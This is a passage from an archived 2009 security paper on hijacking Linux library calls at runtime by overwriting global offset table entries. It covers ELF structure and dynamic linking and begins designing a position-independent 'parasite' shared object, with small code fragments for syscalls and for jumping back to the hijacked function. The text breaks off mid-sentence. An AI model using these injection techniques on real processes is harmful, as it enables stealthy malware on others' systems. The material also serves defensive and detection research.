<!--?xml version="1.0"?-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
<title>Ryan O'Neill 'Modern Day ELF Runtime infection via GOT poisoning' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="Author" content="Ryan O'Neill">
<meta name="KeyWords" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, O'Neill, Ryan,Modern Day ELF Runtime infection via GOT poisoning, ptrace, null, printf, offset, unsigned, ehdr, shdrp, string, sysenter, poketext, shdr, function, phdr, long, char" lang="en">
<meta name="Description" content="This paper is a document that outlines a specific algorithm to hijack shared library calls within a running process. While working on my UNIX AV tool for ELF parasite disinfection and memory resident parasite analysis, I stumbled upon an algorithm for hijacking shared library calls through global offset table poisoning, and coded a hijacker that uses the algorithm to demonstrate it. Runtime infection through shared library linking is not a new concept; so why would I write a paper on it?">
<body style="background-color:#dcdcdc;">


<h1><b>Modern Day ELF Runtime infection via GOT poisoning</b></h1>

Ryan O'Neill<br>
<i>May 2009</i><br>
<br><i>Ryan O'Neill <ryan@bitlackeys.com></i><br><br>

<p><strong>Index</strong></p>
<ul>
<li><a href="#c1">1. Introduction</a>
<ul>
<li><a href="#c11">1.1 What is this paper / Why did I write it</a></li>
<li><a href="#c12">1.2 Who is it for</a></li>
<li><a href="#c13">1.3 Related papers</a></li>
</ul></li>
<li><a href="#c2">2. ELF &amp; Dynamic linking</a></li>
<li><a href="#c3">3. Writing the parasite</a></li>
<li><a href="#c4">4. Loading the parasite</a>
<ul>
<li><a href="#c41">4.1 Loading the library the normal way</a></li>
<li><a href="#c42">4.2 Loading the library the GRsec way</a></li>
</ul></li>
<li><a href="#c5">5. ptrace primer</a></li>
<li><a href="#c6">6. The complete algorithm</a></li>
<li><a href="#c7">7. The hijacker</a></li>
<li><a href="#c8">8. After thoughts</a>
<ul>
<li><a href="#c81">1.1 Improvements</a></li>
<li><a href="#c82">1.2 ELFsh</a></li>
<li><a href="#c83">1.3 Staying hidden</a></li>
</ul></li>
<li><a href="#c9">9. References</a></li>
</ul>
<h2><a name="c1"></a>1 - Introduction</h2>
<h3><a name="c11"></a>1.1 What is this paper? Why did I write it?</h3>
<p>This paper is a document that outlines a specific algorithm to hijack
 shared library calls within a running process. While working on my UNIX
 AV tool for ELF parasite disinfection and memory resident parasite 
analysis, I stumbled upon an algorithm for hijacking shared library 
calls through global offset table poisoning, and coded a hijacker that 
uses the algorithm to demonstrate it. Runtime infection through shared 
library linking is not a new concept; so why would I write a paper on 
it?</p>
<p>I did so for several reason:</p>
<h4>Reason #1</h4>
<p>Previous papers either:</p>
<ol type="A">
<li>merely outlined the concept without providing complete code.</li>
<li>Provided complete code, but provided poor detail and left out key 
points in the paper itself leaving the reader disappointed and wanting 
to know more about the algorithm, parasite, and theory.</li>
<li>Demonstrate methods of .so loading that are not inherently portable,
 not compatible with todays versions of glibc, and will not work in 
Linux OS's that are patched with grsec (see below) and use a hijacking 
algorithm that modifies the original symbol (easier to detect and 
slower).</li>
</ol>
<h4>Reason #2</h4>
<p>I'm working on UNIX AV code, and I have already devised a method of 
detecting the infections shown in the previous papers and code such as 
overwriting the first several bytes of the original symbol with a 
movl/jmp or a pushl/ret to new code, which is very easy to detect. 
Whereas I have not yet devised a solution for automatically detecting 
the method shown in this paper, as it is somewhat more difficult to 
detect heuristically (but certaintly not impossible).</p>
<h4>Reason #3</h4>
<p>In this paper I present previously unpublished techniques on 
bypassing the grsec kernel patch which prevents shellcode injection into
 the text segment as a result of binary flag mprotect()'s.</p>
<h4>Reason #4</h4>
<p>I provide a new &amp; up-to-date ELF runtime infector that will 
successfully run on the latest Linux kernels and glibc, and with only 
slight modifications; other OS's like FreeBSD.</p>
<h4>Reason #5</h4>
<p>In releasing my runtime infector, I thought it would be a pity if a 
proper paper wasn't included to detail the exquisite art in the 
infection and parasite.</p>
<h3><a name="c12"></a>1.2 Who is it for?</h3>
<p>The expected general audience would be anyone who takes a deep 
interest in security and knows the C language, as well as some basic ELF
 knowledge. ELF is a vast topic and it is recommended that you read the 
ELF specs, I will only cover the basic aspects that are relevant to this
 paper. This document is also for people who are already familiar with 
.so injection concepts and would like to know a more stealth method of 
.so injection (i.e is modifying the original symbol necessary?) and 
would also like to walk away with new software for runtime infection 
that works well in current versions of Linux using new versions of 
glibc, as well as against security patches that prevent shellcode 
injection.</p>
<h3><a name="c13"></a>1.3 Related papers</h3>
<p>There have been some really great papers that have documented 
different types of ELF infections. The ones most closely related to this
 paper are:</p>
<dl>
<dt><a href="http://phrack.org/issues.html?issue=56&amp;id=7#article">Shared library redirection via ELF PLT Infection</a> by Silvio</dt>
<dd>Silvio's paper is probably the most important to me; the paper you 
are reading is somewhat of a continuation, but documents pure runtime 
infection, thus no binary modifications.</dd>
<dt><a href="http://althing.cs.dartmouth.edu/local/subversiveld.pdf">Cheating the ELF</a> by Grugq</dt>
<dd>This is a good paper that covers ideas for parasites which 
manipulate dynamic linking on various platforms. I believe there is a 
project based on this paper called the Subversive dynamic linking 
library.</dd>
<dt><a href="http://phrack.org/issues.html?issue=61&amp;id=8#article">The Cerberus ELF Interface</a> by Mayhem</dt>
<dd>This paper presents excellent techniques I've never seen before 
which are demonstrated using elfsh. It shows a method of ET_REL 
injection which will work in programs that don't have a GOT 
(staticically compiled binaries), whereas shared object injection will 
not. It also presents a new technique that extends from Silvios ELF PLT 
infection for portability and PaX evasion.</dd>
</dl>
<h2><a name="c2"></a>2 - ELF &amp; Dynamic Linking</h2>
<p>Here is a brief ELF primer. ELF (Executable Linking Format) is the 
file format used for executables and object files in Linux (Among other 
OS's). It is this format that contains all of the code and data for a 
program and information on how it will be loaded into memory. There are 
many components involved in how a program is organized on disk and what 
it takes to be loaded into memory with the right information so that it 
executes, I will cover some basic aspects.</p>
<p>An ELF file is made up of segments and sections, as well as headers 
to describe their contents. segments contain sections within them, some 
of these segments are loaded into memory and are therefore considered to
 be 'loadable segments' (marked by PT_LOAD), and others are not. The two
 primary loadable segments that contain program data are the text 
segment and the data segment; one of which contains the actual program 
code, and the other containing initialized and uninitialized data -- 
basically anything that's not declared on the stack (i.e global 
variables). The headers that describe these segments are called program 
headers, and they look like this:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_type;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off&nbsp; &nbsp; &nbsp; &nbsp;p_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr&nbsp; &nbsp; &nbsp; p_vaddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr&nbsp; &nbsp; &nbsp; p_paddr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_filesz;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_memsz;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_flags;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Word&nbsp; &nbsp; &nbsp; p_align;<br>
<span style="color: black;">}</span> Elf32_Phdr;<br>
&nbsp;</div>
<p>As mentioned above, this is not an ELF tutorial so we will only be covering a small portion of this;</p>
<ul>
<li>p_vaddr is where in memory the segment starts</li>
<li>p_offset is how many bytes into the file the segment starts</li>
<li>p_type defines the type i.e is it a loadable segment? PT_LOAD</li>
<li>p_filesz is how large the segment is on disk</li>
<li>p_memsz is how large the segment is in memory</li>
</ul>
<p>We'll leave it at that for now. The next aspect to touch upon is the 
ELF sections -- these are what organize data within the segments i.e one
 part of the text segment might contain data such as strings (like 
.rodata), whereas another section denotes where actual executable code 
exists (like .text). To describe these sections there exists section 
headers, which look like this:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_name;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_type;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_flags;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Addr&nbsp; &nbsp; &nbsp; sh_addr;<br>
&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Off&nbsp; &nbsp; &nbsp; &nbsp;sh_offset;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_size;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_link;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_info;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_addralign;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; sh_entsize;<br>
<span style="color: black;">}</span> Elf32_Shdr;<br>
&nbsp;</div>
<ul>
<li>sh_name contains an offset into the string table for the name of its section</li>
<li>sh_type defines the type of section</li>
<li>sh_flags will tell us if a section is RWX.</li>
<li>sh_addr is the start vaddr of the section in memory</li>
<li>sh_offset is the offset of where the section starts in the file</li>
<li>sh_link points to another section (in our case symbolic information)</li>
<li>sh_size is the size of the section on file and in memory</li>
</ul>
<p>So as you can see, these headers provide us with a map to the entire 
file or process image but in order to locate these headers we must first
 get the initial ELF header. The beginning of every executable or object
 file starts with the initial ELF header, which contains a bit of magic;
 The ELF magic is <tt>7f 45 4c 46</tt> -- or 7f ELF.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">typedef</span> <span style="color: #993333;">struct</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span>&nbsp; &nbsp;e_ident<span style="color: black;">[</span>EI_NIDENT<span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_type;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_machine;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; e_version;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ElfN_Addr&nbsp; &nbsp; &nbsp; &nbsp;e_entry;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ElfN_Off&nbsp; &nbsp; &nbsp; &nbsp; e_phoff;<br>
&nbsp; &nbsp; &nbsp; &nbsp; ElfN_Off&nbsp; &nbsp; &nbsp; &nbsp; e_shoff;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t&nbsp; &nbsp; &nbsp; &nbsp; e_flags;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_ehsize;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_phentsize;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_phnum;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_shentsize;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_shnum;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint16_t&nbsp; &nbsp; &nbsp; &nbsp; e_shstrndx;<br>
<span style="color: black;">}</span> Elf32_Ehdr;<br>
&nbsp;</div>
<p>All we really need to be concerned with here are the following:</p>
<ul>
<li>e_type this will tell us if a file is executable, dynamic, or relocatable</li>
<li>e_phoff is the offset of the program headers from the start of the file</li>
<li>e_shoff is the offset of the section headers from the start of the file</li>
<li>e_phnum is the number of program headers</li>
<li>e_shnum is the number of section headers</li>
</ul>
<p>So accessing and manipulating an ELF file or process image is pretty easy.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* open, fstat the ELF file, then mmap it */</span><br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> *mem = mmap<span style="color: black;">(</span><span style="color: #cc66cc;">0</span>, st.<span style="color: #202020;">st_size</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
Elf32_Ehdr *ehdr = <span style="color: black;">(</span>Elf32_Ehdr *<span style="color: black;">)</span>mem;<br>
Elf32_Phdr *phdr = <span style="color: black;">(</span>Elf32_Phdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_phoff<span style="color: black;">)</span>;<br>
Elf32_Shdr *shdr = <span style="color: black;">(</span>Elf32_Shdr *<span style="color: black;">)</span><span style="color: black;">(</span>mem + ehdr-&gt;e_shoff<span style="color: black;">)</span>;<br>
&nbsp;</div>
<p>To modify the ELF headers its best to modify the privately mmap'd 
memory space, then rewrite the file from scratch with the mods (ELF 
viruses or infectors do this) and if we are modifying the process image 
then ptrace can be used.</p>
<p>For the sake of this paper and simplicity, our test program -- our target -- will be very simple:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> main<span style="color: black;">(</span><span style="color: #993333;">void</span><span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span><span style="color: black;">(</span>;;<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"test!<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sleep<span style="color: black;">(</span><span style="color: #cc66cc;">5</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>To get a visual idea of how an ELF file is laid out try the readelf command i.e</p>
<pre class="source"># readelf -l &lt;file&gt; (to get program header info)
# readelf -S &lt;file&gt; (to get section header info)
# readelf -r &lt;file&gt; (to get relocation info, covered more below)
</pre>
<p>Lets take a look at the section headers of our test program:</p>
<pre class="source">localhost hijack$ readelf -S test

There are 29 section headers, starting at offset 0x1204:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .hash             HASH            08048188 000188 00002c 04   A  5   0  4
  [ 4] .gnu.hash         GNU_HASH        080481b4 0001b4 000020 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d4 0001d4 000060 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048234 000234 000050 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          08048284 000284 00000c 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         08048290 000290 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             080482b0 0002b0 000008 08   A  5   0  4
  [10] .rel.plt          REL             080482b8 0002b8 000020 08   A  5  12  4
  [11] .init             PROGBITS        080482d8 0002d8 000017 00  AX  0   0  4
  [12] .plt              PROGBITS        080482f0 0002f0 000050 04  AX  0   0  4
  [13] .text             PROGBITS        08048340 000340 000194 00  AX  0   0 16
  [14] .fini             PROGBITS        080484d4 0004d4 00001c 00  AX  0   0  4
  [15] .rodata           PROGBITS        080484f0 0004f0 00000e 00   A  0   0  4
  [16] .eh_frame         PROGBITS        08048500 000500 000004 00   A  0   0  4
  [17] .ctors            PROGBITS        08049f0c 000f0c 000008 00  WA  0   0  4
  [18] .dtors            PROGBITS        08049f14 000f14 000008 00  WA  0   0  4
  [19] .jcr              PROGBITS        08049f1c 000f1c 000004 00  WA  0   0  4
  [20] .dynamic          DYNAMIC         08049f20 000f20 0000d0 08  WA  6   0  4
  [21] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
  [22] .got.plt          PROGBITS        08049ff4 000ff4 00001c 04  WA  0   0  4
  [23] .data             PROGBITS        0804a010 001010 00000c 00  WA  0   0  4
  [24] .bss              NOBITS          0804a01c 00101c 000004 00  WA  0   0  4
  [25] .comment          PROGBITS        00000000 00101c 00010a 00      0   0  1
  [26] .shstrtab         STRTAB          00000000 001126 0000db 00      0   0  1
  [27] .symtab           SYMTAB          00000000 00168c 000330 10     28  31  4
  [28] .strtab           STRTAB          00000000 0019bc 00014e 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings)
  I (info), L (link order), G (group), x (unknown)
  O (extra OS processing required) o (OS specific), p (processor specific)
</pre>
<p>As you can see there are many sections, the ones we will ultimately be interested in are .text, .dynsym, .rel.plt, .rel.dyn</p>
<p><strong>Dynamic linking</strong></p>
<p>Lets move on to the dynamic linking aspect of things, since afterall 
we are going to be doing a bit of dynamic linking of our own. Lets 
briefly remember what a dynamically shared object library is. 
Dynamically shared objects, unlike static libraries (.a files) are code 
that is not actually linked until runtime, hence dynamically linked. 
When an executable is compiled, symbolic references to the shared object
 functions are made, but at runtime these references will become 
symbolic definitions; actual addresses to where the functions have been 
mmap'd into the process address space. For instance, within an 
executable there will be multiple calls to libc functions, i.e a call to
 strcpy may look like "call 8048330 strcpy@plt" that address '8048330' 
is to a location in the .plt (Procedure linking table), the PLT will 
resolve the functions real address at runtime. Lets take a look at our 
PLT:</p>
<pre class="source">080482f0 &lt;__gmon_start__@plt-0x10&gt;:
 80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
 80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
 80482fc:       00 00                   add    %al,(%eax)
        ...

08048300 &lt;__gmon_start__@plt&gt;:
 8048300:       ff 25 00 a0 04 08       jmp    *0x804a000
 8048306:       68 00 00 00 00          push   $0x0
 804830b:       e9 e0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;

08048310 &lt;__libc_start_main@plt&gt;:
 8048310:       ff 25 04 a0 04 08       jmp    *0x804a004
 8048316:       68 08 00 00 00          push   $0x8
 804831b:       e9 d0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;

08048320 &lt;sleep@plt&gt;:
 8048320:       ff 25 08 a0 04 08       jmp    *0x804a008
 8048326:       68 10 00 00 00          push   $0x10
 804832b:       e9 c0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;

08048330 &lt;puts@plt&gt;:
 8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
 8048336:       68 18 00 00 00          push   $0x18
 804833b:       e9 b0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;
</pre>
<p>The ELF spec gives the best explanation of the PLT and the GOT 
(Global offset table) -- it is necessary to know what the GOT is first 
(Which is what we will be modifying later on)</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">extern</span> Elf32_Addr _GLOBAL_OFFSET_TABLE_<span style="color: black;">[</span><span style="color: black;">]</span>;</div>
<p>Here is a paragraph on the GOT from the ELF spec [4]:</p>
<blockquote>Position-independent code cannot, in general, contain 
absolute virtual addresses. Global offset tables hold absolute addresses
 in private data, thus making the addresses available without 
compromising the position-independence and sharability of a program's 
text. A program references its global offset table using 
position-independent addressing and extracts absolute values, thus 
redirecting position-independent references to absolute locations.</blockquote>
<p>So after a symbol in an executable has been resolved at runtime, its 
absolute address will be stored in the global offset table, and future 
calls to that function reference the global offset table... THUS 
modifying it could -- under special circumstances-- redirect a library 
function call to another place in memory; we will do this later on. So 
lets examine the .plt section of our program, as shown by objdump up 
above. The first time a function is called, the following process 
happens (we will use puts() from above as an example)</p>
<pre class="source">08048330 &lt;puts@plt&gt;:
 8048330:       ff 25 0c a0 04 08       jmp    *0x804a00c
 8048336:       68 18 00 00 00          push   $0x18
 804833b:       e9 b0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;
</pre>
<p>The PLT first does an indirect jmp to *0x804a00c which is an entry in
 the GOT that does not yet hold the resolved address for puts(), but 
instead has an address to the next instruction in the PLT; which is a 
push:</p>
<pre class="source">8048336:       68 18 00 00 00          push   $0x18</pre>
<p>The value 0x18 or 24 is pushed onto the stack, this is the relocation
 offset for puts() it is actually an offset into the relocation table 
and will be of type R_386_JUMP_SLOT</p>
<pre class="source">localhost hijack$ readelf -r test

Relocation section '.rel.dyn' at offset 0x2b0 contains 1 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff0  00000106 R_386_GLOB_DAT    00000000   __gmon_start__

Relocation section '.rel.plt' at offset 0x2b8 contains 4 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a000  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
0804a004  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main
0804a008  00000307 R_386_JUMP_SLOT   00000000   sleep
0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts
</pre>
<p>There are 3 fields, lets look at the 'Offset'. If you notice the 
relocation offset for puts() specifies the address of the global offset 
entry that the PLT jumped to before pushing $0x18 onto the stack. The 
relocation offset '0804a00c' will be the location that the absolute 
address for puts() is eventually stored. Lets move onto the next 
instruction by the PLT:</p>
<pre class="source">804833b:       e9 b0 ff ff ff          jmp    80482f0 &lt;_init+0x18&gt;</pre>
<p>This is a jump back to the first PLT entry '80492f0', known as PLT0 -- ours looks like:</p>
<pre class="source">080482f0 &lt;__gmon_start__@plt-0x10&gt;:
 80482f0:       ff 35 f8 9f 04 08       pushl  0x8049ff8
 80482f6:       ff 25 fc 9f 04 08       jmp    *0x8049ffc
</pre>
<p>First know that the global offset table has its 2nd and 3rd entry reserved:</p>
<p>The first instruction above pushes the 2nd entry of the GOT onto the 
stack, this value is the address of the link_map (struct link_map), and 
the next instruction jumps to 0x8049ffc which is the 3rd entry in the 
global offset table, and this transfers control to the dynamic linker. 
The dynamic linker gets the offset for the relocation entry from the 
stack (0x18 in our case), resolves the address for the symbol and stores
 it in the GOT entry specified by the relocation offset (r_offset) which
 in our case is 804a00c. Future calls to puts@plt will jump directly to 
804a00c which now contains the resolved address to the library function,
 instead of the address to the push $0x18.</p>
<p>By default Linux uses what's called Lazy linking, this means that a 
symbol is not resolved until it is called for the first time; this 
behavior can be changed with LD_BIND_NOW environment variable.</p>
<p>So now that the process of dynamic linking has been explained, we can
 think of ways to subvert it. There are two methods that came to my mind
 when considering the possibilities for shared library call hijacking, 
here they are.</p>
<p>Method A. overwrite the first 6 bytes of the shared library function 
with a push $0x0, ret. then patch it with the address of the replacement
 library function, and temporarily removing the push/ret from the 
original function before invoking it through a saved function pointer.</p>
<p>Method B. overwrite the global offset table entry for the function 
you want to hijack with the mmap'd address of your replacement function,
 then jump to the original function from the end of the replacement 
function.</p>
<p>I decided that method B. would have better runtime speed. It is this 
method that we will be discussing in this paper. The only real dilemma 
we have, is getting our shared library (the parasite) loaded into the 
process image on the fly, but first we must have a proper parasite 
design.</p>
<h2><a name="c3"></a>3 - Writing the parasite</h2>
<p>Our parasite is a shared library object, more specifically a 
replacement function to do whatever we want -- this means we can perform
 additional checks and modify the arguments before invoking the original
 function. Designing the parasite is a lot of fun, and is fortunately 
the easy part of the process. In designing the algorithm for hijacking 
shared library calls, there are a number of rules that must be in place 
for everything to work.</p>
<p>1. Our shared object should be position independent code, this is 
because we mmap() it into the process but don't apply any relocations. A
 function like dlopen() will parse and apply the relocs for you, but our
 loader code does not use dlopen(), instead we use a more simple 
approach which is to mmap() our shared object, and make sure the object 
is completely position independent, or is statically compiled using Diet
 Libc. The initial idea was to use something like dlopen; in modern 
versions of glibc, there exists only __libc_dlopen_mode() which provided
 some problems, which I'm sure could be worked out, but I opted not to 
use it for this paper because I felt it wasn't necessary; You should be 
able to write the parasite completely in C, read below:</p>
<p>NOTE on Diet Libc</p>
<p>Avoiding libc in your parasite might be undesirable for what you want
 to do, but using libc will result in us needing to parse relocations, 
therefore requiring more sophisticated object loading shellcode. 
Fortunately there is a good way around that, which is to use Diet libc, a
 compressed and lightweight version of libc that you can statically 
compile into your shared library to avoid relocs. The provided hijacking
 technique and code should work fine with such a compiled library.</p>
<p>PIC Example:</p>
<p>If the parasite is to be (PIC) position independent code, you should 
obviously not be using calls to libc etc. instead, only direct calls to 
syscalls, and they must be suited for PIC.</p>
<p>Here is an example of a position independent way to use a syscall</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">static</span> <span style="color: #993333;">int</span><br>
_write <span style="color: black;">(</span><span style="color: #993333;">int</span> fd, <span style="color: #993333;">void</span> *buf, <span style="color: #993333;">int</span> count<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; <span style="color: #993333;">long</span> ret;<br>
<br>
&nbsp; __asm__ __volatile__ <span style="color: black;">(</span><span style="color: #ff0000;">"pushl %%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"movl %%esi,%%ebx<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"int $0x80<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\t</span>"</span> <span style="color: #ff0000;">"popl %%ebx"</span>:<span style="color: #ff0000;">"=a"</span> <span style="color: black;">(</span>ret<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; :<span style="color: #ff0000;">"0"</span> <span style="color: black;">(</span>SYS_write<span style="color: black;">)</span>, <span style="color: #ff0000;">"S"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> fd<span style="color: black;">)</span>,<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"c"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> buf<span style="color: black;">)</span>, <span style="color: #ff0000;">"d"</span> <span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">long</span><span style="color: black;">)</span> count<span style="color: black;">)</span><span style="color: black;">)</span>;<br>
&nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ret &gt;= <span style="color: #cc66cc;">0</span><span style="color: black;">)</span> <span style="color: black;">{</span><br>
&nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">(</span><span style="color: #993333;">int</span><span style="color: black;">)</span> ret;<br>
&nbsp; <span style="color: black;">}</span><br>
&nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Also, your parasite make file should look something like this:</p>
<pre class="source">gcc -fPIC -c libtest.c -nostdlib
ld -shared -soname libtest.so.1 -o libtest.so.1.0 libtest.o
</pre>
<p>2. The end of our replacement function needs to somehow return flow 
of execution back to the original function with the stack pointer in 
place etc. My parasite framework ends with a function epilogue, and an 
indirect jmp back to the original function; this is one way a parasite 
function can end:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> __asm__ __volatile__<br>
&nbsp; &nbsp; <span style="color: black;">(</span><span style="color: #ff0000;">"movl %ebp, %esp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"pop %ebp<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"movl $0x00000000, %eax<span style="color: #000099; font-weight: bold;">\n</span>"</span> <span style="color: #ff0000;">"jmp *%eax"</span><span style="color: black;">)</span>;<br>
&nbsp;</div>
<p>Keep it volatile so it stays in place for when we go to patch it.</p>
<p><strong>The test parasite</strong></p>
<p>Our target program, if you recall, simply prints the word 'test!' 
every 5 seconds; as a result we will be hijacking the libc puts() 
function. Our replacement function should have the same parameters as 
